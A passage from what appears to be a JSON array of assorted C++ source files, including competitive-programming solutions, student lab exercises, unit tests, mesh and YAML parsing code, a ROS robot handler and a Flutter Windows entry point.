robot_id));\n  }\n}\n\nvoid getInitialGoal(int robot_id,\n                    const geometry_msgs::msg::PoseStamped::SharedPtr pose) {\n  if (!first_goal[robot_id]) {\n    initial_goal[robot_id] = *pose;\n    first_goal[robot_id] = true;\n  }\n}\n\nvoid robotDeactivated(const std_msgs::msg::Int32::SharedPtr msg) {\n  int robot_id = msg->data;\n  deactivateRobot[robot_id] = true;\n}\n\nvoid robotActivated(const std_msgs::msg::Int32::SharedPtr msg) {\n  int robot_id = msg->data;\n  activateRobot[robot_id] = true;\n\n  if (deactivateRobot[robot_id]) {\n    if (activateRobot[robot_id]) {\n      std::cout << \"Activating...\" << std::endl;\n      deactivateRobot[robot_id] = f",
    "#include<iostream>\n#include<vector>\nusing namespace std;\nint main()\n{\nclass Solution {\npublic:\n    void setZeroes(vector<vector<int>>& arr) {\n        int m = arr.size();\n        int n =arr[0].size();\n        vector<bool>row(m,false);\n        vector<bool>col(n,false);\n        \n        for(int i=0;i<m;i++)\n        {\n            for(int j=0;j<n;j++)\n            {\n                if(arr[i][j]==0)\n                {\n                    row[i] =true;// true means 0 set karna hai\n                    col[j] =true;\n                }\n            }\n        }\n        \n        // set rows zero\n        for(int i=0;i<m;i++)\n        {\n            if(row[i]==true)\n            {\n                for(int j=0;j<n;j++)\n                {\n                    arr[i][j] =0;\n                }\n            }\n        }\n        \n         // set cols zero\n        for(int j=0;j<n;j++)\n        {\n            if(col[j]==true)\n            {\n                for(int i=0;i<m;i++)\n                {\n                    arr[i][j] =0;\n                }\n            }\n        }\n        \n        \n    }\n};\n}\n/*\nGiven an m x n integer matrix matrix, if an element is 0, set its entire row and column to 0's.\n\nYou must do it in place.\nExample 1:\nInput: matrix = [[1,1,1],[1,0,1],[1,1,1]]\nOutput: [[1,0,1],[0,0,0],[1,0,1]]\n*/",
    "#include <idExtractor.hpp>\n\nidExtractor::idExtractor(settings *setting, json conf) {\n    this->setting = setting;\n    this->conf = conf;\n}\n\nvoid idExtractor::extractData() {\n    // these two types dont need id extraction\n    if(setting->mediaType == \"music\" || setting->mediaType == \"video\") {\n        if(setting->idOverwrite == -1) {\n            setting->idOverwrite = 1;\n        }\n        if(setting->indexOverwrite == -1) {\n            setting->indexOverwrite = 1;\n        }\n\n        return;\n    }\n\n    cout << \"==\" << endl;\n    cout << \"== \" << colors::boldCyan(\"Generating auto ID and auto Index...\") << endl;\n    cout << \"==\\t\" << colors::cyan(\"- Scraping filespaths\");\n\n    string playlistPath = \"\";\n    string channelPath = \"\";\n    string playlistCount = \"\";\n    int episodeCount = 0;\n    int id = 0;\n\n    // setup paths and names -- todo fill in artist and album\n    if(setting->mediaType == \"videoPlaylist\") {\n        // this path is without a ending slash /\n        playlistPath = string(conf[\"videoPath\"]) + tools::executeCommand(YT_DLP_PARSE_PATH(DEFAULT_VIDEO_PLAYLIST_PATH_PATTERN, setting->dlUrl));\n        // also without a ending slash /\n        channelPath = playlistPath;\n        channelPath = channelPath.erase(channelPath.find_last_of(\"/\"));\n    } \n\n    if(setting->mediaType == \"musicPlaylist\") {\n        // this path is without a ending slash /\n        playlistPath = string(conf[\"musicPath\"]) + tools::executeCommand(YT_DLP_PARSE_PATH(DEFAULT_MUSIC_PLAYLIST_PATH_PATTERN, setting->dlUrl));\n        // also without a ending slash /\n        channelPath = playlistPath;\n        channelPath = channelPath.erase(channelPath.find_last_of(\"/\"));\n    }\n    \n    if(setting->mediaType == \"rss\") { \n        // this path is without a ending slash /\n        playlistPath = string(conf[\"rssPath\"]) + tools::executeCommand(YT_DLP_PARSE_PATH(DEFAULT_RSS_PLAYLIST_PATH_PATTERN, setting->dlUrl));\n        playlistCount = tools::executeCommand(YT_DLP_PARSE_PATH(\"%(playlist_count)s\", setting->dlUrl));\n    }\n\n    cout << colors::boldGreen(\" - done\") << endl;\n\n    //  its a existing playlist from and existing channel\n    if(fs::exists(playlistPath)) {\n        cout << \"==\\t\" << colors::cyan(\"- Found existing Playlist from existing Channel\");\n\n        // this can run for videosPlaylist, musicPlaylist and also RSS\n        for (const auto& entry : std::filesystem::directory_iterator(playlistPath)) {\n            // skip the info files\n            if(entry.path().extension() == \".mp4\" || \\\n               entry.path().extension() == \".m4a\" || \\\n               entry.path().extension() == \".mp3\" || \\\n               entry.path().extension() == \".aac\") { \n                episodeCount++;\n            }\n        }\n\n        if(setting->indexOverwrite == -1) {\n            if(setting->reverse == true) {\n                // if its reverse, index from the back\n                setting->indexOverwrite = std::stoi(playlistCount) - episodeCount;\n            } else {\n                // its +1 because we want the next one to be downloaded\n                setting->indexOverwrite = episodeCount + 1;\n            }\n        }\n\n        if(setting->mediaType == \"videoPlaylist\") {\n            for (const auto& entry : std::filesystem::directory_iterator(playlistPath)) {\n                // get the filename and extract the id by Season\n                string fileName = entry.path().filename().string();\n                // match for pattern SxEx\n                string match = tools::getRegexMatches(fileName, \"S([0-9]+)E([0-9]+)\")[0];\n\n                // if its empty just skip it\n                if(match.empty()) {\n                    continue;\n                } else {\n                    // strip the episode number\n                    match = tools::getRegexMatches(match, \"S([0-9]+)\")[0];\n                    // else get the biggest of all ids\n                    int curId = std::stoi(match.substr(1));\n                    if(curId > id) {\n                        id = curId;\n                    }\n                }\n            }\n\n            if(setting->idOverwrite == -1) {\n                setting->idOverwrite = id;\n            }\n        }\n\n        // we are done here\n        cout << colors::boldGreen(\" - done\") << endl;\n        cout << \"==\" << endl;\n        tools::printLine();\n        return;\n    }\n\n    // its a new playlist from an existing channel\n    if(fs::exists(channelPath)) {\n        cout << \"==\\t\" << colors::cyan(\"- Found new Playlist from existing Channel\");\n\n        // if its reverse we have to index from the back\n        if(setting->indexOverwrite == -1) {\n            if(setting->reverse == true) {\n                setting->indexOverwrite = std::stoi(playlistCount);\n            } else {\n                setting->indexOverwrite = 1;\n            }\n        }\n\n        // now generate a new id but only for video playlists\n        if(setting->mediaType == \"videoPlaylist\") {\n            for (const auto& entry : std::filesystem::directory_iterator(channelPath)) {\n             ",
    "#include \"gtest/gtest.h\"\r\n#include \"circular_buffer.hpp\"\r\n\r\n// Test enqueue and dequeue operations\r\nTEST(CircularBufferQueueTest, Enqueue_Dequeue) {\r\n    CircularBuffer<int> queue(5);\r\n    ASSERT_EQ(queue.is_stopped(), false);\r\n\r\n    queue.enqueue(10);\r\n    queue.enqueue(20);\r\n    queue.enqueue(30);\r\n    ASSERT_EQ(queue.dequeue(), 10);\r\n    ASSERT_EQ(queue.dequeue(), 20);\r\n\r\n    queue.enqueue(40);\r\n    ASSERT_EQ(queue.dequeue(), 30);\r\n\r\n    queue.enqueue(50);\r\n    ASSERT_EQ(queue.dequeue(), 40);\r\n    ASSERT_EQ(queue.dequeue(), 50);\r\n}\r\n\r\n// Test peek operation\r\nTEST(CircularBufferQueueTest, Peek) {\r\n    CircularBuffer<int> queue(5);\r\n    \r\n    queue.enqueue(100);\r\n    queue.enqueue(200);\r\n    queue.enqueue(300);\r\n    ASSERT_EQ(queue.peek(0), 100);\r\n    ASSERT_EQ(queue.peek(1), 200);\r\n    ASSERT_EQ(queue.peek(2), 300);\r\n}\r\n\r\n// Test stop operation\r\nTEST(CircularBufferQueueTest, Stop_Buffer) {\r\n    CircularBuffer<int> queue(5);\r\n    ASSERT_EQ(queue.is_stopped(), false);\r\n    queue.stop();\r\n    ASSERT_EQ(queue.is_stopped(), true);\r\n}",
    "#include<iostream>\n#include<vector>\n#include<queue>\n//#include<bits/stdc++.h>\nusing namespace std;\n\nclass Solution {\npublic:\n    vector<int> maxSlidingWindow(vector<int>& nums, int k) {\n        \n        // store only large elements in deque -> u'll get decreasing order\n        // remove samller and out of bounds elements\n        // the front of the deque will yield the answer\n\n        vector<int> ans;\n        deque<int> dq;\n        //Note : store indexs in Deque not elements\n\n        for(int i = 0;i<nums.size();i++){\n\n            // if dq if empty\n            if(dq.empty()){\n                dq.push_front(i);\n            }\n            else{\n\n                // remove out of bounds elemets\n                while(!dq.empty() && i-dq.front() >= k){\n                    dq.pop_front();\n                }\n\n                // remove smaller elements coz they make no-sense\n                while(!dq.empty() && nums[dq.back()] <= nums[i]){\n                    dq.pop_back();\n                }\n\n                // add current ele index\n                dq.push_back(i);\n            }\n\n            // note : we will only store ans if it corresponads to window od size k\n\n            if(i>=k-1)ans.push_back(nums[dq.front()]);\n\n        }\n\n        return ans;\n    }\n};",
    "/*\n Program Name: Exception_Handling.cpp\n Programmer: Moris Gomez\n Date: Tuesday 05/2/2024\n Version Control: 10.0\n About: Week 12, CSCI 2, Lab.\n Description:\n Write a class named TestScores. The class constructor\n should accept an array of test scores as its argument.\n The class should have a member function that returns the\n average of the test scores. If any test score in the\n array is negative or greater than 100, the class should\n throw an exception. Demonstrate the class in a program.\n */\n\n#include <iostream>\nusing namespace std;\n\nclass TestScores\n{\nprivate:\n    int size;\n    int *ptrScores; //points to address of first value in array.\npublic:\n    //nested class for throwing object type to catch:\n    class InvalidScore\n    {\n        //empty class btw.\n    }; //end nested class NegativeScore.\n    \n    //constructor:\n    TestScores(int s, int *ptr) //pointer to array in main.\n    {\n        size = s;\n        ptrScores = ptr;\n    }\n    \n    //function #1:\n    double average()\n    {\n        double sum = 0.0; //sumTracker.\n        //loop through array:\n        for (int i = 0; i < size; i++)\n        {\n            if(ptrScores[i] < 0 || ptrScores[i] > 100)\n            {\n                throw InvalidScore();\n                //type of throw & catch is object.\n            }\n            else\n            {\n                sum = sum + ptrScores[i];\n                //ptrScores[0] same as *ptrScores\n                //ptrScores[1] same as *ptrScores\n            }\n        } //end loop.\n        return sum/size;\n    } //end function average.\n}; //end class TestScores.\n\n\nint main()\n{\n    int sizeArray = 5;\n    int array[5] = {0, 80, 90, 91, 111}; //ERROR.\n    TestScores s1(sizeArray, array);\n        \n    try\n    {\n        cout << \"average of test scores: \" << s1.average() << endl;\n    } //end try.\n    \n    catch(TestScores::InvalidScore) //type of throw & catch is object.\n    {\n        cout << endl << \"[ERROR] <-- Test scores cannot be negative or greater than 100 -->\" << endl;\n    } //end catch.\n    return 0;\n}\n",
    "#include \"Utils.hpp\"\n#include \"PolygonalMesh.hpp\"\n#include <iostream>\n#include <fstream>\n#include <cmath>\n\n\nusing namespace std;\n\nnamespace MeshLibrary{\n\n//creo una funzione che dato il nome di un file restituisce una mesh poligonale\nbool importMesh(const string& path, PolygonalMesh& mesh)\n{\n    if(!importCell0D(path + \"./Cell0Ds.csv\", mesh))\n        return false;\n    else\n    {\n        cout << \"Cell0D marker:\" << endl;\n        for(auto& el : mesh.VerticesMarker)\n        {\n            cout << \"key: \" << el.first << endl;\n            for(auto& id: el.second)\n                cout << id << \" \";\n            cout << endl;\n        }\n        cout << \"\\n\" << endl;\n    }\n\n    if(!importCell1D(path + \"./Cell1Ds.csv\", mesh))\n        return false;\n    else\n    {\n        cout << \"Cell1D marker:\" << endl;\n        for(auto& el : mesh.EdgesMarker)\n        {\n            cout << \"key: \" << el.first << endl;\n            for(auto& id: el.second)\n                cout << id << \" \";\n            cout << endl;\n        }\n        cout << \"\\n\" << endl;\n\n    }\n\n    if(!importCell2D(path + \"./Cell2Ds.csv\", mesh))\n        return false;\n\n    return true;\n}\n\n\nbool importCell0D(const string& fileName, PolygonalMesh& mesh)\n{\n    ifstream file(fileName);//apro il file\n    if(file.fail())\n        return false;\n\n    string header; //var temporanea\n    getline(file, header);//leggo la prima riga e la memorizzo in 'header'\n\n    string line;\n    while (getline(file, line))//finch\u00e8 non ho raggiunto la fine del file, leggo la riga del file e la memorizzo in line\n    {\n        istringstream convert(line);\n        string id_str, marker_str, x_str, y_str;//var temporanee\n\n        //ora leggo l'id, il marker e le coordinate come stringhe, considerando il delimitatore ';'\n        getline(convert, id_str, ';');\n        getline(convert, marker_str, ';');\n        getline(convert, x_str, ';');\n        getline(convert, y_str, ';');\n\n        //ora converto le stringhe in int e double\n        unsigned int id, marker;//var temp\n        Vector2d coordinates;//var temp\n\n        //creo oggetti istringstream e utilizzo l'operatore di estrazione (>>) per estrarre l'id, il marker e le coordinate\n        istringstream convert1(id_str);\n        convert1 >> id;\n        istringstream convert2(marker_str);\n        convert2 >> marker;\n        istringstream convert3(x_str);\n        convert3 >> coordinates(0);\n        istringstream convert4(y_str);\n        convert4 >> coordinates(1);\n\n        //oppure uso le funzioni stoi e stod\n//        unsigned int id = stoi(id_str);\n//        unsigned int marker = stoi(marker_str);\n//        double x = stod(x_str);\n//        double y = stod(y_str);\n\n\n        mesh.IdCell0Ds.push_back(id);\n        mesh.MarkerCell0Ds.push_back(marker);\n        mesh.CoordinatesCell0Ds.push_back(coordinates);\n        mesh.NumberOfCell0Ds++;\n\n\n        //eseguo un test sui marker delle celle 0D\n        if (marker != 0)\n        {\n            auto ret = mesh.VerticesMarker.insert({marker, {id}});\n            if(!ret.second) //se il ret ha valore false significa che il marker gi\u00e0 esisteva\n                mesh.VerticesMarker[marker].push_back(id);\n        }\n\n    }\n\n    file.close();//chiudo il file\n    return true;\n\n}\n\n\nbool importCell1D(const string& fileName, PolygonalMesh& mesh)\n{\n    ifstream file(fileName);\n    if(file.fail())\n        return false;\n\n    string header;\n    getline(file, header);\n\n    string line;\n    while (getline(file, line))\n    {\n        istringstream convert(line);\n        string id_str, marker_str, origin_str, end_str;\n\n        getline(convert, id_str, ';');\n        getline(convert, marker_str, ';');\n        getline(convert, origin_str, ';');\n        getline(convert, end_str, ';');\n\n        unsigned int id, marker;\n        Vector2i vertices;\n\n        istringstream convert1(id_str);\n        convert1 >> id;\n        istringstream convert2(marker_str);\n        convert2 >> marker;\n        istringstream convert3(origin_str);\n        convert3 >> vertices(0);\n        istringstream convert4(end_str);\n        convert4 >> vertices(1);\n\n        mesh.IdCell1Ds.push_back(id);\n        mesh.MarkerCell1Ds.push_back(marker);\n        mesh.VerticesCell1Ds.push_back(vertices);\n        mesh.NumberOfCell1Ds++;\n\n        //eseguo un test sui marker delle celle 1D\n        if (marker != 0)\n        {\n            auto ret = mesh.EdgesMarker.insert({marker, {id}});\n            if(!ret.second)\n                mesh.EdgesMarker[marker].push_back(id);\n        }\n\n    }\n\n    file.close();\n    return true;\n\n}\n\n\n//eseguo un test su ogni lato, cio\u00e8 verifico che non ci siano lati degeneri e calcolo la lunghezza di ogni cella0D\nbool checkNonDegenerateEdges(const PolygonalMesh& mesh, vector<double>& edgeLengths)\n{\n    edgeLengths.clear();//mi assicuro che il vettore sia vuoto\n    for (const auto& vertices : mesh.VerticesCell1Ds)\n    {\n        unsigned int originId = vertices(0);//id dell'origine\n        unsigned int endId = vertices(1);//id della fine\n\n        //trovo le coordinat",
    "#include \"graphbuilderadapter.h\"\r\n#include \"yaml-cpp/contrib/graphbuilder.h\"\r\n\r\nnamespace YAML {\r\nstruct Mark;\r\n\r\nint GraphBuilderAdapter::ContainerFrame::sequenceMarker;\r\n\r\nvoid GraphBuilderAdapter::OnNull(const Mark &mark, anchor_t anchor) {\r\n  void *pParent = GetCurrentParent();\r\n  void *pNode = m_builder.NewNull(mark, pParent);\r\n  RegisterAnchor(anchor, pNode);\r\n\r\n  DispositionNode(pNode);\r\n}\r\n\r\nvoid GraphBuilderAdapter::OnAlias(const Mark &mark, anchor_t anchor) {\r\n  void *pReffedNode = m_anchors.Get(anchor);\r\n  DispositionNode(m_builder.AnchorReference(mark, pReffedNode));\r\n}\r\n\r\nvoid GraphBuilderAdapter::OnScalar(const Mark &mark, const std::string &tag,\r\n                                   anchor_t anchor, const std::string &value) {\r\n  void *pParent = GetCurrentParent();\r\n  void *pNode = m_builder.NewScalar(mark, tag, pParent, value);\r\n  RegisterAnchor(anchor, pNode);\r\n\r\n  DispositionNode(pNode);\r\n}\r\n\r\nvoid GraphBuilderAdapter::OnSequenceStart(const Mark &mark,\r\n                                          const std::string &tag,\r\n                                          anchor_t anchor,\r\n                                          EmitterStyle::value /* style */) {\r\n  void *pNode = m_builder.NewSequence(mark, tag, GetCurrentParent());\r\n  m_containers.push(ContainerFrame(pNode));\r\n  RegisterAnchor(anchor, pNode);\r\n}\r\n\r\nvoid GraphBuilderAdapter::OnSequenceEnd() {\r\n  void *pSequence = m_containers.top().pContainer;\r\n  m_containers.pop();\r\n\r\n  DispositionNode(pSequence);\r\n}\r\n\r\nvoid GraphBuilderAdapter::OnMapStart(const Mark &mark, const std::string &tag,\r\n                                     anchor_t anchor,\r\n                                     EmitterStyle::value /* style */) {\r\n  void *pNode = m_builder.NewMap(mark, tag, GetCurrentParent());\r\n  m_containers.push(ContainerFrame(pNode, m_pKeyNode));\r\n  m_pKeyNode = nullptr;\r\n  RegisterAnchor(anchor, pNode);\r\n}\r\n\r\nvoid GraphBuilderAdapter::OnMapEnd() {\r\n  void *pMap = m_containers.top().pContainer;\r\n  m_pKeyNode = m_containers.top().pPrevKeyNode;\r\n  m_containers.pop();\r\n  DispositionNode(pMap);\r\n}\r\n\r\nvoid *GraphBuilderAdapter::GetCurrentParent() const {\r\n  if (m_containers.empty()) {\r\n    return nullptr;\r\n  }\r\n  return m_containers.top().pContainer;\r\n}\r\n\r\nvoid GraphBuilderAdapter::RegisterAnchor(anchor_t anchor, void *pNode) {\r\n  if (anchor) {\r\n    m_anchors.Register(anchor, pNode);\r\n  }\r\n}\r\n\r\nvoid GraphBuilderAdapter::DispositionNode(void *pNode) {\r\n  if (m_containers.empty()) {\r\n    m_pRootNode = pNode;\r\n    return;\r\n  }\r\n\r\n  void *pContainer = m_containers.top().pContainer;\r\n  if (m_containers.top().isMap()) {\r\n    if (m_pKeyNode) {\r\n      m_builder.AssignInMap(pContainer, m_pKeyNode, pNode);\r\n      m_pKeyNode = nullptr;\r\n    } else {\r\n      m_pKeyNode = pNode;\r\n    }\r\n  } else {\r\n    m_builder.AppendToSequence(pContainer, pNode);\r\n  }\r\n}\r\n}  // namespace YAML\r\n",
    "// Shortest Routes II\n// https://cses.fi/problemset/task/1672/\n\n#include <bits/stdc++.h>\nusing namespace std;\nconst long long INF = 10e17;\nint main()\n{\n\n\t// Read variables\n\tint n, m, q;\n\tcin >> n >> m >> q;\n\n\t// Build graph from input\n\tvector<vector<pair<int, long long>>> adjacency_list(n + 1);\n\tfor (int i = 0; i < m; i++)\n\t{\n\t\tint source, destination;\n\t\tint weight;\n\t\tcin >> source >> destination >> weight;\n\t\tadjacency_list[source].push_back(make_pair(destination, weight));\n\t\tadjacency_list[destination].push_back(make_pair(source, weight));\n\t}\n\n\t// Floyd-Warshal - Initial distance\n\tvector<vector<long long>> distance(n + 1, vector<long long>(n + 1, INF));\n\tfor (int source = 1; source <= n; source++)\n\t{\n\t\tdistance[source][source] = 0;\n\t\tfor (auto &[destination, weight] : adjacency_list[source])\n\t\t{\n\t\t\tdistance[source][destination] = min(distance[source][destination], weight);\n\t\t}\n\t}\n\n\t// Floyd-Warshal - Find shortest distance\n\tfor (int intermidiate = 1; intermidiate <= n; intermidiate++)\n\t{\n\t\tfor (int source = 1; source <= n; source++)\n\t\t{\n\t\t\tfor (int destination = 1; destination <= n; destination++)\n\t\t\t{\n\t\t\t\tlong long direct_path_distance = distance[source][destination];\n\t\t\t\tlong long alternative_path_distance = distance[source][intermidiate] + distance[intermidiate][destination];\n\t\t\t\tdistance[source][destination] = min(direct_path_distance, alternative_path_distance);\n\t\t\t}\n\t\t}\n\t}\n\n\t// Process queries\n\tfor (int query = 0; query < q; query++)\n\t{\n\t\tint origin, destination;\n\t\tcin >> origin >> destination;\n\t\tif (distance[origin][destination] == INF)\n\t\t{\n\t\t\tdistance[origin][destination] = -1;\n\t\t}\n\t\tcout << distance[origin][destination] << endl;\n\t}\n\n\treturn 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"klekt\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <iomanip>\n#include <string>\n#include <limits>\n#include <cctype>\nusing namespace std;\n\ndouble calcMPG(double gallons, double miles);\n\nint main()\n{\n\tconst double MAX_GALS = 100;\n\tconst double MILES = 500;\n\tbool valid = true;\n\tdouble gallons = 0.0;\n\tdouble mpg = 0.0;\n\tstring carMake;\n\n\n\tcout << \"Enter the make of the car: \";\n\tgetline(cin, carMake);\n\n\tdo\n\t{\n\t\tcout << \"\\nEnter how many gallons of fuel were used: \";\n\t\tcin >> gallons;\n\n\t\tif (cin.fail() || gallons <= 0) // Check for invalid input in the form of characters or 0 or negative numbers\n\t\t{\n\t\t\tif (cin.fail())\n\t\t\t{\n\t\t\t\tcout << \"\\nPlease enter numbers and not characters.\\n\";\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tcout << \"\\nInvalid input. Please enter a positive number.\\n\";\n\t\t\t}\n\t\t\tcin.clear(); // clear error flag\n\t\t\tcin.ignore(numeric_limits<streamsize>::max(), '\\n'); // ignore input in buffer until newline character\n\t\t\tvalid = false; // set flag to false to ensure do while loops again\n\t\t}\n\t\telse if (gallons > MAX_GALS)\n\t\t{\n\t\t\tcout << \"\\nThat seems like a very high amount. Are you sure? (y/n): \";\n\t\t\tchar confirm;\n\t\t\tcin >> confirm;\n\n\t\t\tif (tolower(confirm) == 'y')\n\t\t\t{\n\t\t\t\tvalid = true;\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tvalid = false;\n\t\t\t\tcin.clear();\n\t\t\t\tcin.ignore(numeric_limits<streamsize>::max(), '\\n');\n\t\t\t}\n\t\t}\n\t\telse\n\t\t{\n\t\t\tvalid = true; // set flag to true to exit loop\n\t\t}\n\t} while (!valid);\n\n\tmpg = calcMPG(gallons, MILES);\n\n\tcout << fixed << setprecision(2);\n\tcout << endl << \"During the 500 mile drive, the \" << carMake << \"'s fuel efficiency was \" << mpg << \" miles per gallon.\" << endl;\n\n\treturn 0;\n}\n\ndouble calcMPG(double gallons, double miles)\n{\n\treturn miles / gallons;\n}",
    "#include \"ihtngenerator.hpp\"\n\n#include <boost/property_tree/json_parser.hpp>\n#include <boost/filesystem.hpp>\n\n#include \"../validmissiongenerator/validmissiongenerator.hpp\"\n\nusing namespace std;\n\nIHTNGenerator::IHTNGenerator(GMGraph gm, ATGraph mission_decomposition, bool verbose, bool pretty_print, vector<ground_literal> world_state, vector<pair<ground_literal,variant<int,float>>> world_state_functions, vector<string> high_level_loc_types, vector<string> high_level_agent_types, map<string,string> type_mappings, map<string,CompleteDecompositionPath> decomposition_path_mapping) {\n    this->gm = gm;\n    this->mission_decomposition = mission_decomposition;\n    this->verbose = verbose;\n    this->pretty_print = pretty_print;\n    this->world_state = world_state;\n    this->world_state_functions = world_state_functions;\n    this->high_level_loc_types = high_level_loc_types;\n    this->high_level_agent_types = high_level_agent_types;\n    this->type_mappings = type_mappings;\n    this->decomposition_path_mapping = decomposition_path_mapping;\n}\n\n/*\n    Function: generate_ihtn\n    Objective: Generate one iHTN for each valid mission decomposition\n\n    @ Input 1: The semantic mappings given in the configuration file\n\t@ Input 2: The mappings of the OCL variables from the Goal Model\n\t@ Input 3: The robot-related sorts\n    @ Output: Void. The iHTNs are generated in JSON files in a new ihtn folder. If the folder exists, its context is erased previous to the creation of the new files\n*/\nvoid IHTNGenerator::generate_ihtn(vector<SemanticMapping> semantic_mapping, map<string, variant<pair<string,string>,pair<vector<string>,string>>> gm_var_map, map<string,set<string>> robot_related_sorts_map) {\n    ConstraintManager constraint_generator(gm, mission_decomposition, verbose, pretty_print);\n    vector<Constraint> mission_constraints = constraint_generator.generate_mission_constraints();\n\n    set<string> robot_related_sorts;\n\n    map<string,set<string>>::iterator r_sorts_it;\n    for(r_sorts_it = robot_related_sorts_map.begin(); r_sorts_it != robot_related_sorts_map.end(); r_sorts_it++) {\n        robot_related_sorts.insert(r_sorts_it->second.begin(),r_sorts_it->second.end());\n    }\n\n    ValidMissionGenerator valid_missions_generator(mission_decomposition, gm, mission_constraints, world_state, world_state_functions, semantic_mapping, gm_var_map, verbose, robot_related_sorts, pretty_print);\n    pair<vector<vector<pair<int,ATNode>>>,set<Decomposition>> valid_mission_decompositions_and_expanded_decompositions = valid_missions_generator.generate_valid_mission_decompositions();\n\n    vector<vector<pair<int,ATNode>>> valid_mission_decompositions = valid_mission_decompositions_and_expanded_decompositions.first;\n    set<Decomposition> expanded_decompositions = valid_mission_decompositions_and_expanded_decompositions.second;\n\n    map<int,ATNode> nodes_map;\n    map<int,pair<vector<int>,vector<constraint_type>>> seq_fb_constraints_map; \n    map<int,pair<vector<int>,vector<pair<bool,bool>>>> exec_constraints_map;\n\n    for(Constraint c : mission_constraints) {\n        if(c.type == SEQ || c.type == FB) {\n            if(seq_fb_constraints_map.find(c.nodes_involved.first.first) == seq_fb_constraints_map.end()) {\n                pair<vector<int>,vector<constraint_type>> aux;\n                aux.first.push_back(c.nodes_involved.second.first);\n                aux.second.push_back(c.type);\n\n                seq_fb_constraints_map[c.nodes_involved.first.first] = aux;\n            } else {\n                seq_fb_constraints_map[c.nodes_involved.first.first].first.push_back(c.nodes_involved.second.first);\n                seq_fb_constraints_map[c.nodes_involved.first.first].second.push_back(c.type);\n            }\n        } else if(c.type == NC) {\n            if(exec_constraints_map.find(c.nodes_involved.first.first) == exec_constraints_map.end()) {\n                pair<vector<int>,vector<pair<bool,bool>>> aux1;\n\n                aux1.first.push_back(c.nodes_involved.second.first);\n                aux1.second.push_back(make_pair(c.group,c.divisible));\n\n                exec_constraints_map[c.nodes_involved.first.first] = aux1;\n\n                if(exec_constraints_map.find(c.nodes_involved.second.first) == exec_constraints_map.end()) {\n                    pair<vector<int>,vector<pair<bool,bool>>> aux2;\n\n                    aux2.first.push_back(c.nodes_involved.first.first);\n                    aux2.second.push_back(make_pair(c.group,c.divisible));\n\n                    exec_constraints_map[c.nodes_involved.second.first] = aux2;\n                } else {\n                    exec_constraints_map[c.nodes_involved.second.first].first.push_back(c.nodes_involved.first.first);\n                    exec_constraints_map[c.nodes_involved.second.first].second.push_back(make_pair(c.group,c.divisible));\n                }\n            } else {\n                exec_constraints_map[c.nodes_involved.first.first].first.push_back(c.nodes_involved.second.first);\n                exec_constrain",
    "#include <iostream>\n#include <queue>\n\nusing namespace std;\n\nbool cmp(pair<int, int>& a, pair<int, int>& b)\n{\n\tif (a.second == b.second)\n\t{\n\t\treturn a.first < b.first;\n\t}\n\telse\n\t{\n\t\treturn a.second < b.second;\n\t}\n}\n\nint n, m;\nint paperCnt;\nint k;\n\nvector<pair<int, int>> wrongPaper;\n\nbool isOk(int mid)\n{\n\tint point = wrongPaper[0].second;\n\tint cnt = 1;\n\n\tfor (int idx = 0; idx < k; idx++)\n\t{\n\t\tpair<int, int> curr = wrongPaper[idx];\n\n\t\tif (curr.first > mid)\n\t\t{\n\t\t\treturn false;\n\t\t}\n\n\t\tif (curr.second >= point + mid)\n\t\t{\n\t\t\tcnt++;\n\t\t\tpoint = curr.second;\n\t\t}\n\t}\n\n\treturn cnt <= paperCnt;\n}\n\nint solution()\n{\n\tint left = 0;\n\tint right = max(n, m) + 1;\n\n\twhile (left + 1 < right)\n\t{\n\t\tint mid = (left + right) / 2;\n\n\t\tif (isOk(mid) == true)\n\t\t{\n\t\t\tright = mid;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tleft = mid;\n\t\t}\n\t}\n\n\treturn right;\n}\n\nvoid input()\n{\n\tcin >> n >> m;\n\n\tcin >> paperCnt;\n\n\tcin >> k;\n\n\tfor (int idx = 0; idx < k; idx++)\n\t{\n\t\tint i, j;\tcin >> i >> j;\n\t\twrongPaper.push_back({ i, j });\n\t}\n\n\tsort(wrongPaper.begin(), wrongPaper.end(), cmp);\n}\n\nint main()\n{\n\tios::sync_with_stdio(0); cin.tie(0);\n\n\tinput();\n\n\tcout << solution();\n}\n\n\n\n/*\n14 4\n1\n1\n2 3\n\nans: 2\n*/\n\n/*\n4 14\n2\n2\n4 14\n1 1\n\nans: 4\n*/\n\n/*\n4 14\n2\n2\n1 14\n1 2\n\nans: 1\n*/\n\n/*\n4 14\n1\n2\n4 14\n4 1\n\nans: 14\n*/",
